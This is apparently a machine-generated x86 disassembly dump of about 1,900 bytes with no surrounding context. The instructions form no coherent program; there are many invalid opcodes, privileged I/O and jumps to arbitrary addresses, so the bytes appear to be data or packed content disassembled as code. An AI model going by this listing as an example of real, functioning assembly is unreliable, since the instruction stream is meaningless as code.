  48bb50:	scas   eax,DWORD PTR es:[edi]
  48bb51:	push   es
  48bb52:	loope  0x48bb69
  48bb54:	adc    BYTE PTR [ecx-0x7f18dbe],bh
  48bb5a:	push   edi
  48bb5b:	inc    edi
  48bb5c:	adc    DWORD PTR [esi],ebp
  48bb5e:	call   0x32aa0c22
  48bb63:	dec    esi
  48bb64:	fdivrp st(3),st
  48bb66:	jae    0x48bbba
  48bb68:	test   BYTE PTR [edx],cl
  48bb6a:	mov    DWORD PTR ds:0x66000114,0xd3f29a71
  48bb74:	and    BYTE PTR [eax],bl
  48bb76:	mov    BYTE PTR ds:0x851c2e1a,0xf3
  48bb7d:	jge    0x48bb1e
  48bb7f:	inc    edx
  48bb80:	mov    ds:0x24a31020,eax
  48bb85:	arpl   WORD PTR [eax],bp
  48bb87:	jbe    0x48bbe1
  48bb89:	mov    bh,0x95
  48bb8b:	xor    eax,0x3c8d5cbf
  48bb90:	sbb    eax,0xdd134cb9
  48bb95:	and    BYTE PTR [edi-0x46935384],al
  48bb9b:	pop    esp
  48bb9c:	ins    BYTE PTR es:[edi],dx
  48bb9d:	mov    eax,ds:0x7dd28bdd
  48bba2:	mov    edx,0xb300ddd
  48bba7:	adc    eax,0xa17c9b34
  48bbac:	cmp    BYTE PTR [edi+0x67b5f288],ch
  48bbb2:	mov    bh,0xd
  48bbb4:	or     BYTE PTR [ebx],0x15
  48bbb7:	test   bh,bh
  48bbb9:	cs cmp al,0x5b
  48bbbc:	inc    eax
  48bbbd:	pop    ebp
  48bbbe:	mov    esi,0x8c44e54a
  48bbc3:	dec    eax
  48bbc4:	push   ecx
  48bbc5:	nop
  48bbc6:	xchg   esp,eax
  48bbc7:	push   ds
  48bbc8:	test   al,0xa8
  48bbca:	xlat   BYTE PTR ds:[ebx]
  48bbcb:	sub    ebx,DWORD PTR [eax-0x5fccf9a5]
  48bbd1:	dec    edi
  48bbd2:	cmp    ecx,0x88a40bf9
  48bbd8:	sbb    eax,0x8db436b0
  48bbdd:	and    bl,BYTE PTR [esi+0xe7bc283]
  48bbe3:	xor    eax,0x6510c683
  48bbe8:	imul   DWORD PTR [edx]
  48bbea:	pushf  
  48bbeb:	int3   
  48bbec:	int3   
  48bbed:	inc    si
  48bbef:	mov    BYTE PTR [edi-0x58],bl
  48bbf2:	mov    BYTE PTR [ecx-0x539a41a4],bh
  48bbf8:	mov    BYTE PTR [ebx],ah
  48bbfa:	mov    ah,0xb8
  48bbfc:	mov    esp,0x72f0eb8d
  48bc01:	shl    al,0x90
  48bc04:	dec    ebx
  48bc05:	in     al,0xa
  48bc07:	inc    ebx
  48bc08:	pop    ss
  48bc09:	sbb    al,0x9e
  48bc0b:	pop    edx
  48bc0c:	mov    eax,0xc1c08a69
  48bc11:	adc    al,0xcc
  48bc13:	stos   DWORD PTR es:[edi],eax
  48bc14:	push   ss
  48bc15:	outs   dx,BYTE PTR ds:[esi]
  48bc16:	add    al,0x2
  48bc18:	jne    0x48bc1d
  48bc1a:	je     0x48bbd3
  48bc1c:	push   ds
  48bc1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48bc1e:	call   DWORD PTR [ecx+0x42464298]
  48bc24:	adc    bl,al
  48bc26:	cwde   
  48bc27:	fdiv   DWORD PTR [eax]
  48bc29:	inc    edi
  48bc2a:	fild   WORD PTR [ecx+0xe85f0f9]
  48bc30:	rcl    BYTE PTR [ebp-0x3a],1
  48bc33:	stc    
  48bc34:	mov    ecx,DWORD PTR [edi+0x4f]
  48bc37:	in     al,dx
  48bc38:	cwde   
  48bc39:	js     0x48bc68
  48bc3b:	pop    es
  48bc3c:	inc    eax
  48bc3d:	psubb  mm0,QWORD PTR ds:0xa6825a86
  48bc44:	ficom  DWORD PTR [edx+ecx*2]
  48bc47:	scas   al,BYTE PTR es:[edi]
  48bc48:	xor    al,BYTE PTR [ebp+0x1d]
  48bc4b:	sub    dl,BYTE PTR [eax]
  48bc4d:	add    bh,BYTE PTR [edx-0x24]
  48bc50:	in     al,0x75
  48bc52:	jae    0x48bbf1
  48bc54:	data16 aad 0x12
  48bc57:	scas   al,BYTE PTR es:[edi]
  48bc58:	dec    ecx
  48bc59:	mul    BYTE PTR [edx+0x6]
  48bc5c:	add    eax,0x2e33e010
  48bc61:	cmp    al,0x42
  48bc63:	or     ch,BYTE PTR [edx+0x47eca2]
  48bc69:	add    eax,0xabdc572e
  48bc6e:	mov    esp,0x833afbe
  48bc73:	xor    al,0x30
  48bc75:	cmp    DWORD PTR [esi],ebx
  48bc77:	mov    BYTE PTR [ecx+eax*1+0x6c778c1c],cl
  48bc7e:	push   edi
  48bc7f:	mov    dh,0xc6
  48bc81:	sti    
  48bc82:	sahf   
  48bc83:	jbe    0x48bc8f
  48bc85:	dec    edi
  48bc86:	inc    esp
  48bc87:	test   DWORD PTR [eax+0x46],eax
  48bc8a:	mov    DWORD PTR [esi],eax
  48bc8c:	dec    ebx
  48bc8d:	out    dx,al
  48bc8e:	cmp    esp,DWORD PTR [esi]
  48bc90:	out    dx,al
  48bc91:	add    al,BYTE PTR [ebp+ebx*4+0x4847bae4]
  48bc98:	nop
  48bc99:	inc    ebx
  48bc9a:	dec    ebx
  48bc9b:	add    ebp,DWORD PTR [esi]
  48bc9d:	cmp    al,0xe0
  48bc9f:	dec    esi
  48bca0:	je     0x48bc34
  48bca2:	mov    al,0x3e
  48bca4:	retf   0x8810
  48bca7:	rcl    BYTE PTR [ebp+0x3c],1
  48bcaa:	xor    BYTE PTR [edi+0x7f2aa07],al
  48bcb0:	fst    QWORD PTR [edx]
  48bcb2:	adc    al,0xe6
  48bcb4:	mov    esp,0xdf7c1f1e
  48bcb9:	das    
  48bcba:	or     ah,BYTE PTR [esp+esi*4-0x6dee8c43]
  48bcc1:	mov    edi,0xb7589bc
  48bcc6:	sub    al,0xa
  48bcc8:	jl     0x48bcb4
  48bcca:	outs   dx,BYTE PTR ds:[esi]
  48bccb:	cmp    al,0x60
  48bccd:	adc    edx,DWORD PTR [eax+0x6a74b8]
  48bcd3:	push   edx
  48bcd4:	retf   
  48bcd5:	or     al,dl
  48bcd7:	rcl    edx,cl
  48bcd9:	add    BYTE PTR [edi+0x23c5f694],ch
  48bcdf:	in     al,dx
  48bce0:	(bad)  [eax+0x31]
  48bce3:	push   edx
  48bce4:	pop    eax
  48bce5:	fistp  WORD PTR [eax]
  48bce7:	les    ebp,FWORD PTR [edi]
  48bce9:	adc    al,0x9c
  48bceb:	maskmovq mm7,(bad)
  48bcec:	idiv   DWORD PTR [ecx]
  48bcee:	sbb    DWORD PTR [ecx],ebp
  48bcf0:	cwde   
  48bcf1:	mov    cl,0x82
  48bcf3:	add    BYTE PTR [ebx-0x50],0x2d
  48bcf7:	jno    0x48bd0f
  48bcf9:	lods   al,BYTE PTR ds:[esi]
  48bcfa:	sbb    edi,edi
  48bcfc:	sub    BYTE PTR [ebx],cl
  48bcfe:	fwait
  48bcff:	jecxz  0x48bd5d
  48bd01:	xor    eax,0x4e3fd59c
  48bd06:	adc    BYTE PTR [eax],bl
  48bd08:	les    ebx,FWORD PTR [eax]
  48bd0a:	nop
  48bd0b:	or     BYTE PTR [esi-0x4a439c36],0xca
  48bd12:	xor    al,BYTE PTR [edx*4+0x7678aa2a]
  48bd19:	loopne 0x48bca4
  48bd1b:	sbb    eax,0x3ecee2ff
  48bd20:	adc    DWORD PTR [edx+0xcd2b82b],eax
  48bd26:	clc    
  48bd27:	setl   BYTE PTR [esi]
  48bd2a:	pop    ebx
  48bd2b:	(bad)  
  48bd2c:	into   
  48bd2d:	js     0x48bcd6
  48bd2f:	push   ds
  48bd30:	xor    eax,0xe34bccfc
  48bd35:	mov    BYTE PTR [edi+0x135067cc],dh
  48bd3b:	fdivr  st(0),st
  48bd3d:	std    
  48bd3e:	nop
  48bd3f:	push   ecx
  48bd40:	fwait
  48bd41:	ins    BYTE PTR es:[edi],dx
  48bd42:	das    
  48bd43:	stos   BYTE PTR es:[edi],al
  48bd44:	jp     0x48bd97
  48bd46:	ret    
  48bd47:	add    eax,0xdfce4178
  48bd4c:	fstp   DWORD PTR [ebp+0x70]
  48bd4f:	mov    ds:0x1ff56133,al
  48bd54:	and    BYTE PTR [eax],dh
  48bd56:	stos   DWORD PTR es:[edi],eax
  48bd57:	and    cl,dh
  48bd59:	jbe    0x48bcee
  48bd5b:	dec    eax
  48bd5c:	add    al,0xc5
  48bd5e:	fcomp  st(3)
  48bd60:	add    al,0xb0
  48bd62:	jmp    0xddd6e6c6
  48bd67:	pop    esp
  48bd68:	and    al,0x8
  48bd6a:	fld    QWORD PTR ds:0xdd66cd68
  48bd70:	sbb    al,0x91
  48bd72:	outs   dx,BYTE PTR ds:[esi]
  48bd73:	jno    0x48bd08
  48bd75:	push   edx
  48bd76:	add    cl,BYTE PTR [ecx-0x19]
  48bd79:	xchg   esi,eax
  48bd7a:	(bad)  
  48bd7b:	or     ebp,eax
  48bd7d:	loopne 0x48bd3f
  48bd7f:	fstp   QWORD PTR ds:0xb6cd3430
  48bd85:	call   0x7f0f2372
  48bd8a:	scas   al,BYTE PTR es:[edi]
  48bd8b:	lods   al,BYTE PTR ds:[esi]
  48bd8c:	or     dh,BYTE PTR ds:0x5dccef8
  48bd92:	xor    BYTE PTR [edi-0x23],0x38
  48bd96:	mov    eax,0xf4dc383a
  48bd9b:	shr    BYTE PTR [ecx],1
  48bd9d:	sub    eax,0x9583dd2
  48bda2:	retf   0xa380
  48bda5:	bound  esi,QWORD PTR [edi]
  48bda7:	test   DWORD PTR [ecx],edx
  48bda9:	dec    ebx
  48bdaa:	cmp    al,0x27
  48bdac:	dec    eax
  48bdad:	mov    ebx,0x6abf3fed
  48bdb2:	enter  0xc62b,0x33
  48bdb6:	rol    BYTE PTR [ecx-0x78f08001],cl
  48bdbc:	jo     0x48bd54
  48bdbe:	push   eax
  48bdbf:	cmp    ecx,0x18017717
  48bdc5:	sub    eax,esp
  48bdc7:	xchg   BYTE PTR [ecx-0x1df5606d],bl
  48bdcd:	add    BYTE PTR [ebx],0xb0
  48bdd0:	push   esi
  48bdd1:	and    BYTE PTR [ebx],ah
  48bdd3:	mov    ds:0x2c48701,eax
  48bdd8:	mov    bl,0x6e
  48bdda:	xor    eax,0x4336e212
  48bddf:	xor    BYTE PTR [esi-0x339f4a90],ah
  48bde5:	mov    al,ds:0x20738d19
  48bdea:	scas   eax,DWORD PTR es:[edi]
  48bdeb:	add    DWORD PTR [ebx],edi
  48bded:	scas   eax,DWORD PTR es:[edi]
  48bdee:	push   cs
  48bdef:	cmp    eax,0x81dc4b53
  48bdf4:	clc    
  48bdf5:	dec    ebp
  48bdf6:	cld    
  48bdf7:	mov    DWORD PTR [edi+0x3b],ecx
  48bdfa:	pop    ebx
  48bdfb:	dec    DWORD PTR [edi]
  48bdfd:	in     al,dx
  48bdfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48bdff:	pop    edx
  48be00:	les    ebp,FWORD PTR [eax-0x41]
  48be03:	fidivr WORD PTR [ecx*8-0x41f74cda]
  48be0a:	mov    esi,0x92088178
  48be0f:	fidiv  DWORD PTR [eax+eax*8]
  48be12:	stos   DWORD PTR es:[edi],eax
  48be13:	dec    eax
  48be14:	pop    ds
  48be15:	xchg   al,cl
  48be17:	push   ecx
  48be18:	jno    0x48bdf4
  48be1a:	shr    esi,cl
  48be1c:	neg    BYTE PTR [eax]
  48be1e:	adc    cl,BYTE PTR [edx]
  48be20:	sbb    al,0x66
  48be22:	or     al,0x20
  48be24:	ret    0x707d
  48be27:	pavgb  mm1,QWORD PTR [ecx+eiz*4]
  48be2b:	push   ebp
  48be2c:	ret    0x81c7
  48be2f:	adc    DWORD PTR [edx],edx
  48be31:	lahf   
  48be32:	jmp    0x48be80
  48be34:	int3   
  48be35:	dec    esp
  48be36:	and    eax,0xf7eebe42
  48be3b:	iretw  
  48be3d:	mov    BYTE PTR [esp+ebx*1-0x42],dh
  48be41:	add    BYTE PTR [edx+0x180b147b],al
  48be47:	inc    ecx
  48be48:	inc    BYTE PTR [ecx]
  48be4a:	pop    esi
  48be4b:	sbb    al,0x82
  48be4d:	dec    ecx
  48be4e:	cli    
  48be4f:	lods   al,BYTE PTR ds:[esi]
  48be50:	mov    ecx,0x77df8230
  48be55:	enter  0x40b1,0x13
  48be59:	push   eax
  48be5a:	les    ebx,FWORD PTR [ebx-0x6c]
  48be5d:	or     ebx,DWORD PTR [eax+0x2e5cb972]
  48be63:	pushf  
  48be64:	mov    al,ds:0x9761a8a4
  48be69:	retf   
  48be6a:	in     eax,0xac
  48be6c:	mov    al,0xb4
  48be6e:	mov    eax,0x2b357a8b
  48be73:	adc    BYTE PTR [ebx-0x44],bh
  48be76:	cmp    DWORD PTR [ecx-0x2c],0x2e
  48be7a:	in     eax,dx
  48be7b:	dec    ecx
  48be7c:	loop   0x48bea6
  48be7e:	call   0x72f0:0x7ddcd848
  48be85:	stc    
  48be86:	or     esp,eax
  48be88:	in     al,0xe8
  48be8a:	or     cl,0xec
  48be8d:	xor    BYTE PTR [edi-0x47],0x1c
  48be91:	rcr    BYTE PTR [ebp-0x10],cl
  48be94:	hlt    
  48be95:	clc    
  48be96:	cld    
  48be97:	aaa    
  48be98:	lods   al,BYTE PTR ds:[esi]
  48be99:	lods   al,BYTE PTR ds:[esi]
  48be9a:	sbb    al,0xe4
  48be9c:	add    BYTE PTR [ebx-0x7cf77cfc],al
  48bea2:	or     al,0x83
  48bea4:	mov    ecx,0x10a90e5c
  48bea9:	adc    al,0x18
  48beab:	sbb    al,0x77
  48bead:	mov    ecx,0x2420721c
  48beb2:	sub    BYTE PTR [edi+edx*1],ch
  48beb5:	jnp    0x48be78
  48beb7:	retf   
  48beb8:	retf   0x3d30
  48bebb:	cmp    BYTE PTR [ebx+eax*4],bh
  48bebe:	jg     0x48be7e
  48bec0:	push   eax
  48bec1:	adc    ecx,edx
  48bec3:	inc    ecx
  48bec4:	jbe    0x48bf05
  48bec6:	ret    0xbebc
  48bec9:	je     0x48be4f
  48becb:	sbb    DWORD PTR [eax-0x7c],0x5c
  48becf:	test   bl,bl
  48bed1:	pop    ds
  48bed2:	jne    0x48be92
  48bed4:	pusha  
  48bed5:	or     esp,DWORD PTR [edx+eiz*2-0x34]
  48bed9:	mov    ecx,0xf27385b0
  48bede:	push   ebp
  48bedf:	fisubr WORD PTR [eax+eax*2-0x30]
  48bee3:	test   DWORD PTR [ebx+0x68],edx
  48bee6:	hlt    
  48bee7:	test   esp,edx
  48bee9:	or     ebx,eax
  48beeb:	lock mov bl,0xcb
  48beee:	in     eax,0xe0
  48bef0:	in     al,0xe8
  48bef2:	pop    ebp
  48bef3:	xor    DWORD PTR [ebp+ecx*4+0x45],ebp
  48bef7:	les    ebx,FWORD PTR [edx+eiz*2+0x9859f9]
  48befe:	xchg   BYTE PTR ds:0xfbd38608,bh
  48bf04:	sbb    al,0x35
  48bf06:	hlt    
  48bf07:	sti    
  48bf08:	push   edi
  48bf09:	scas   eax,DWORD PTR es:[edi]
  48bf0a:	pop    edx
  48bf0b:	add    al,0x81
  48bf0d:	ret    
  48bf0e:	jl     0x48be91
  48bf10:	daa    
  48bf11:	ror    DWORD PTR [edi+eax*4],cl
  48bf14:	movq   QWORD PTR [ebx+ebp*2+0x6adbc498],mm4
  48bf1c:	test   BYTE PTR [eax+0x5c43741d],0x2e
  48bf23:	pop    ds
  48bf24:	mov    esi,0xc5640b70
  48bf29:	push   0x3e5c6c60
  48bf2e:	sbb    BYTE PTR [ecx-0x77f92340],bh
  48bf34:	sbb    eax,0x10eccf8
  48bf39:	mov    bl,0xe9
  48bf3b:	xor    BYTE PTR [eax],dh
  48bf3d:	and    dl,BYTE PTR [eax+0x616eeea9]
  48bf43:	add    BYTE PTR [edx],dl
  48bf45:	add    al,0x33
  48bf47:	cmp    eax,0x7a0b8278
  48bf4c:	sub    ch,BYTE PTR [edi]
  48bf4e:	xchg   edi,eax
  48bf4f:	jl     0x48bed1
  48bf51:	dec    esp
  48bf52:	test   BYTE PTR [eax-0x48],dl
  48bf55:	sub    bl,bh
  48bf57:	sti    
  48bf58:	rcr    DWORD PTR [edi+ebx*2],1
  48bf5b:	mov    ecx,0xa05e0afa
  48bf60:	jne    0x48bee4
  48bf62:	ja     0x48bf7c
  48bf64:	loope  0x48bf9d
  48bf66:	sti    
  48bf67:	or     edx,DWORD PTR [eax-0x5cb5ab39]
  48bf6d:	test   BYTE PTR [edx-0x1690a244],al
  48bf73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48bf74:	mov    eax,ds:0x6c0364a6
  48bf79:	mov    ecx,DWORD PTR ds:0xce0cbe9a
  48bf7f:	mov    WORD PTR [edx+0x5c1f97b7],es
  48bf85:	imul   esp,DWORD PTR [ecx+eiz*2+0x24],0x420711aa
  48bf8d:	shl    BYTE PTR [eax-0x54],0xb1
  48bf91:	dec    ecx
  48bf92:	sbb    DWORD PTR [edx-0x62a8b65],0xa
  48bf99:	bound  esp,QWORD PTR [esi-0x7263fe3e]
  48bf9f:	cwde   
  48bfa0:	retf   
  48bfa1:	into   
  48bfa2:	push   ss
  48bfa3:	mov    esp,0xcf9d013c
  48bfa8:	mov    esi,eax
  48bfaa:	cmp    esi,eax
  48bfac:	sub    BYTE PTR ds:0xbd5804c1,0x60
  48bfb3:	xchg   ah,bh
  48bfb5:	stos   DWORD PTR es:[edi],eax
  48bfb6:	or     eax,0xfae6c4f5
  48bfbb:	add    al,0xee
  48bfbd:	rol    BYTE PTR [ecx+0x4],0x7
  48bfc1:	xchg   esi,eax
  48bfc2:	cmp    cl,ch
  48bfc4:	clc    
  48bfc5:	sbb    dh,dh
  48bfc7:	test   BYTE PTR [edx+0x7d025c92],dl
  48bfcd:	aas    
  48bfce:	mov    edx,DWORD PTR [esi]
  48bfd0:	push   edi
  48bfd1:	push   edx
  48bfd2:	dec    eax
  48bfd3:	push   eax
  48bfd4:	aam    0x67
  48bfd6:	push   edi
  48bfd7:	sub    DWORD PTR [esi],ecx
  48bfd9:	xlat   BYTE PTR ds:[ebx]
  48bfda:	in     eax,dx
  48bfdb:	cmp    dh,BYTE PTR [ebx+eax*4+0x5b]
  48bfdf:	idiv   DWORD PTR [ebx-0x1]
  48bfe2:	es (bad) 
  48bfe4:	xor    esp,edx
  48bfe6:	jge    0x48bf74
  48bfe8:	inc    edx
  48bfe9:	add    BYTE PTR [edi-0x2fe9aafa],bl
  48bfef:	lea    eax,[edx+0x7]
  48bff2:	jne    0x48bfd2
  48bff4:	repz faddp st(1),st
  48bff7:	push   ds
  48bff8:	femms  
  48bffa:	fcomi  st,st(5)
  48bffc:	push   ss
  48bffd:	aas    
  48bffe:	scas   al,BYTE PTR es:[edi]
  48bfff:	add    ebp,edx
  48c001:	push   ecx
  48c002:	mov    edi,0x8bc0b810
  48c007:	jo     0x48c04b
  48c009:	or     edi,DWORD PTR [ebx-0x546bea3a]
  48c00f:	mov    cl,0xa2
  48c011:	loopne 0x48bfd3
  48c013:	mov    eax,0x6ddf2911
  48c018:	clc    
  48c019:	or     BYTE PTR cs:[esi+0x76],bh
  48c01d:	add    dl,BYTE PTR [eax+ecx*4]
  48c020:	lock int 0x6d
  48c023:	lock adc eax,0x7ddccccb
  48c029:	lock cmp ah,ah
  48c02c:	in     al,0x1
  48c02e:	mov    ebx,0x2d5ff0f0
  48c033:	mov    BYTE PTR [eax],ah
  48c035:	add    eax,0x2f8e5ea6
  48c03a:	mov    ds:0x4eb420f2,al
  48c03f:	push   esi
  48c040:	call   0x7a53:0xa1ff4acd
  48c047:	inc    edi
  48c048:	adc    BYTE PTR [ebp+0x14fd105e],cl
  48c04e:	and    dl,cl
  48c050:	ret    0x352f
  48c053:	and    BYTE PTR [ebx],dl
  48c055:	mov    BYTE PTR [ebx],0xa1
  48c058:	dec    ecx
  48c059:	stos   DWORD PTR es:[edi],eax
  48c05a:	mov    edi,0xd81a563e
  48c05f:	rol    BYTE PTR [ecx+eax*2+0x320a084e],1
  48c066:	shr    eax,0x69
  48c069:	loope  0x48c0bd
  48c06b:	std    
  48c06c:	pop    ecx
  48c06d:	js     0x48c07d
  48c06f:	adc    ebp,DWORD PTR [ecx+0x3bf0f070]
  48c075:	ss jecxz 0x48c0ac
  48c078:	nop
  48c079:	mov    esi,0xfac09550
  48c07e:	lock mov BYTE PTR [esi+0x18382b6],ah
  48c085:	aas    
  48c086:	and    eax,0xf6ee60bf
  48c08b:	add    DWORD PTR ds:0xfbba45ce,esp
  48c091:	push   eax
  48c092:	push   edi
  48c093:	mov    cl,dh
  48c095:	sbb    edi,DWORD PTR [edx-0x2e]
  48c098:	mov    eax,0x7f6cbcf0
  48c09d:	sbb    BYTE PTR [esi],ah
  48c09f:	xchg   edx,eax
  48c0a0:	sub    al,0x81
  48c0a2:	mov    esi,DWORD PTR [edx]
  48c0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c0a5:	add    BYTE PTR [eax],bl
  48c0a7:	fwait
  48c0a8:	jo     0x48c09b
  48c0aa:	sub    al,0xf6
  48c0ac:	data16 cmp bh,dl
  48c0af:	mov    al,ds:0xf1b19bf6
  48c0b4:	fisttp DWORD PTR [ecx-0x40c476c0]
  48c0ba:	jg     0x48c05b
  48c0bc:	inc    esp
  48c0bd:	je     0x48c13c
  48c0bf:	inc    esi
  48c0c0:	fild   DWORD PTR [edx+eiz*8-0x80]
  48c0c4:	jge    0x48c0c1
  48c0c6:	push   ss
  48c0c7:	xor    edx,edx
  48c0c9:	mov    al,ds:0x81690d8
  48c0ce:	xchg   esi,eax
  48c0cf:	ja     0x48c057
  48c0d1:	push   ebp
  48c0d2:	loopne 0x48c05c
  48c0d4:	jg     0x48c14d
  48c0d6:	ja     0x48c0a2
  48c0d8:	xchg   BYTE PTR [ecx+0x21],al
  48c0db:	mov    edx,eax
  48c0dd:	imul   eax,DWORD PTR [ecx+edx*4],0x1f767d8d
  48c0e4:	lods   al,BYTE PTR ds:[esi]
  48c0e5:	aaa    
  48c0e6:	test   DWORD PTR [edi+eax*8+0x7f],edi
  48c0ea:	jne    0x48c0cb
  48c0ec:	push   ds
  48c0ed:	cmp    dh,al
  48c0ef:	push   0xcc8190d0
  48c0f4:	push   edi
  48c0f5:	adc    esi,edi
  48c0f7:	inc    ebp
  48c0f8:	bound  ebp,QWORD PTR [ebx-0x4e]
  48c0fb:	fbld   TBYTE PTR [edi+0x50dc459f]
  48c101:	(bad)  
  48c102:	cmp    BYTE PTR [ebp+0x4c],al
  48c105:	iret   
  48c106:	inc    ebp
  48c107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c108:	mov    BYTE PTR [ebp+0xf],0x0
  48c10c:	loop   0x48c10d
  48c10e:	dec    eax
  48c10f:	pushw  es
  48c111:	inc    edx
  48c112:	pop    es
  48c113:	add    ecx,DWORD PTR [edx-0x9cc04ab]
  48c119:	lea    ecx,[eax-0x31]
  48c11c:	mov    bl,BYTE PTR [edi+0x68]
  48c11f:	add    BYTE PTR [ecx+ecx*4-0x2d7b57b3],ah
  48c126:	rcr    BYTE PTR [eax],1
  48c128:	hlt    
  48c129:	clc    
  48c12a:	adc    al,0xba
  48c12c:	adc    ch,BYTE PTR [esi+0x1e]
  48c12f:	hlt    
  48c130:	jmp    0x48c15b
  48c132:	ror    BYTE PTR [eax],cl
  48c134:	and    dh,BYTE PTR [ebx+0x22e301e1]
  48c13a:	aam    0xa4
  48c13c:	and    ebp,esi
  48c13e:	cmp    ebx,DWORD PTR [ebp-0xbe10bf]
  48c144:	jle    0x48c147
  48c146:	test   al,0x5b
  48c148:	inc    BYTE PTR [eax+0x320f23f2]
  48c14e:	mov    cs,WORD PTR [eax+0xb]
  48c151:	sub    al,0x3b
  48c153:	(bad)  
  48c154:	jle    0x48c17e
  48c156:	popa   
  48c157:	dec    ecx
  48c158:	adc    al,0x1c
  48c15a:	sbb    eax,0xc38e13e4
  48c15f:	mov    al,ds:0xec86e22f
  48c164:	pop    ebp
  48c165:	pop    edi
  48c166:	lds    ebp,FWORD PTR [esi]
  48c168:	gs or  dh,ah
  48c16b:	jmp    0x48c109
  48c16d:	mov    DWORD PTR [ebx],edi
  48c16f:	jae    0x48c115
  48c171:	inc    ebp
  48c172:	push   ss
  48c173:	add    ebp,DWORD PTR [ecx]
  48c175:	shl    BYTE PTR [esi],1
  48c177:	mov    ah,0x3f
  48c179:	or     edi,DWORD PTR ss:[edx+0x3]
  48c17d:	and    ecx,DWORD PTR [ecx]
  48c17f:	adc    al,0x45
  48c181:	xchg   edx,eax
  48c182:	mov    al,BYTE PTR [ecx]
  48c184:	lea    ebx,[edx+eax*4+0x15]
  48c188:	lahf   
  48c189:	pop    ecx
  48c18a:	pop    esp
  48c18b:	arpl   WORD PTR [eax+0x171690c1],bx
  48c191:	pop    es
  48c192:	and    eax,0x4a08ad2f
  48c197:	fiadd  WORD PTR [ecx+0x10d9b07e]
  48c19d:	cwde   
  48c19e:	jnp    0x48c15e
  48c1a0:	fidivr WORD PTR [ebp+0x2926af01]
  48c1a6:	mov    ah,0x20
  48c1a8:	cmp    BYTE PTR ds:0xc68dbc23,dl
  48c1ae:	inc    edi
  48c1af:	or     eax,0x303c4b74
  48c1b4:	inc    DWORD PTR [ebx]
  48c1b6:	mov    esp,0x9813585e
  48c1bb:	dec    ebx
  48c1bc:	mov    bl,BYTE PTR [edx]
  48c1be:	rcr    BYTE PTR [edi],0x17
  48c1c1:	ds (bad) 
  48c1c3:	jmp    0xb09c:0xb8e1515f
  48c1ca:	add    DWORD PTR [edx+eax*1],0xffffffd4
  48c1ce:	stos   BYTE PTR es:[edi],al
  48c1cf:	aaa    
  48c1d0:	je     0x48c1fc
  48c1d2:	and    eax,0xba315636
  48c1d7:	das    
  48c1d8:	mov    eax,ds:0x1aa4ecbf
  48c1dd:	fisubr WORD PTR [eax+0xfbbace6]
  48c1e3:	out    0xf0,al
  48c1e5:	cmp    DWORD PTR [edx+esi*4],0x28
  48c1e9:	dec    ecx
  48c1ea:	and    eax,0xaca76a94
  48c1ef:	add    al,0xb1
  48c1f1:	fld    TBYTE PTR [edi]
  48c1f3:	(bad)  
  48c1f4:	out    0x4b,eax
  48c1f6:	mov    esp,0xcdeb0cd8
  48c1fb:	jno    0x48c273
  48c1fd:	mov    ebx,0x187480c7
  48c202:	ss mov bh,0x6c
  48c205:	add    DWORD PTR [eax-0x2bcb4882],edx
  48c20b:	jo     0x48c232
  48c20d:	inc    esi
  48c20e:	das    
  48c20f:	popa   
  48c210:	push   eax
  48c211:	mov    edx,edi
  48c213:	in     al,0x6f
  48c215:	sbb    al,BYTE PTR [eax+0x744bba15]
  48c21b:	mov    eax,ds:0xcbdb7a3c
  48c220:	enter  0xe1ed,0xd6
  48c224:	lock sub eax,edx
  48c227:	mov    ebx,ss
  48c229:	lods   eax,DWORD PTR cs:[esi]
  48c22b:	inc    ecx
  48c22c:	push   cs
  48c22d:	xchg   BYTE PTR [edx],ch
  48c22f:	or     ch,cl
  48c231:	rcr    BYTE PTR es:[edi],1
  48c234:	mov    eax,ds:0xa62b1c19
  48c239:	add    eax,0x5fc1f75
  48c23e:	jo     0x48c1cd
  48c240:	adc    cl,BYTE PTR [eax+0x7d4058df]
  48c246:	adc    cl,BYTE PTR [ecx+0x50c88b4]
  48c24c:	or     al,0x65
  48c24e:	cmp    edi,DWORD PTR [edx+0x26]
  48c251:	inc    DWORD PTR [eax-0x73c7c998]
  48c257:	pusha  
  48c258:	xor    al,al
  48c25a:	in     eax,dx
  48c25b:	jbe    0x48c2aa
  48c25d:	jne    0x48c29f
  48c25f:	or     esi,edi
  48c261:	cmp    eax,0x3cc0d21f
  48c266:	aaa    
  48c267:	scas   al,BYTE PTR es:[edi]
  48c268:	xchg   ecx,eax
  48c269:	or     al,0x4e
  48c26b:	loop   0x48c2e8
  48c26d:	icebp  
  48c26e:	push   cs
  48c26f:	outs   dx,BYTE PTR ds:[esi]
  48c270:	test   edx,edx
  48c272:	jle    0x48c297
  48c274:	inc    eax
  48c275:	add    ecx,0x3b09fa7f
  48c27b:	jecxz  0x48c2a8
  48c27d:	push   ds
  48c27e:	cdq    
  48c27f:	idiv   DWORD PTR [ecx+0x612af4fe]
  48c285:	cld    
  48c286:	xor    eax,0x3d0af08
  48c28b:	repnz dec edi
  48c28d:	fadd   st(6),st
  48c28f:	pop    es
  48c290:	push   cs
  48c291:	add    bl,BYTE PTR ds:0x1499a88e
  48c297:	adc    DWORD PTR [ebx-0x6d],0x3b7b76ee
  48c29e:	adc    edi,0xc2562a75
  48c2a4:	and    DWORD PTR [ebx+edx*1],edi
  48c2a7:	les    esi,FWORD PTR [ecx]
  48c2a9:	xor    al,BYTE PTR [ebp-0x77fcea2]
  48c2af:	mov    ebx,0x3b175ebb
  48c2b4:	mov    cl,0x89
  48c2b6:	jge    0x48c2c7
  48c2b8:	inc    edx
  48c2b9:	mov    bh,BYTE PTR [ebx]
  48c2bb:	sar    BYTE PTR [edx+ebp*8+0x46],1
  48c2bf:	adc    dh,BYTE PTR [esi]
  48c2c1:	js     0x48c2af
  48c2c3:	sub    BYTE PTR [edi+edi*8],al
  48c2c6:	and    ebx,DWORD PTR [eax-0x66c17ba0]
  48c2cc:	add    DWORD PTR [eax+0x140e349c],esi
  48c2d2:	and    al,0xbc
  48c2d4:	and    eax,0x3f00af34
  48c2d9:	js     0x48c2e8
  48c2db:	pop    edx
  48c2dc:	ret    
  48c2dd:	and    eax,0x30d7eb70
  48c2e2:	add    BYTE PTR [ecx-0x2abbbc1d],cl
  48c2e8:	fadd   DWORD PTR [esi+0x5f]
  48c2eb:	imul   esi,DWORD PTR [edi],0xf6442079
  48c2f1:	sbb    al,0x82
